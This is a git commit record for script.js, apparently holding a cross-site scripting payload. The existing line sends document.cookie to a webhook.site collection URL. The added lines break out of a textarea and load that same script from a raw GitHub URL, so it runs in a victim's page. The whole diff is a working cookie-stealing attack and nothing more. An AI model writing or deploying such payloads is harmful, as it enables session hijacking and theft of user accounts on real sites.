055420656006a75ba26a41368e79fa18887febb5
Rodrigo Alves <93993233+El-Psy-Kongrooo@users.noreply.github.com>
2024-12-04 15:30:36 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,4 @@
 window.open("https://webhook.site/d17989b9-1585-4eeb-9e98-f5e1d827a675/?cookie=" + encodeURIComponent(document.cookie));
+</textarea>
+<script src="https://raw.githubusercontent.com/El-Psy-Kongrooo/Sudoku-BruteForce/main/script.js"></script>
+<textarea>
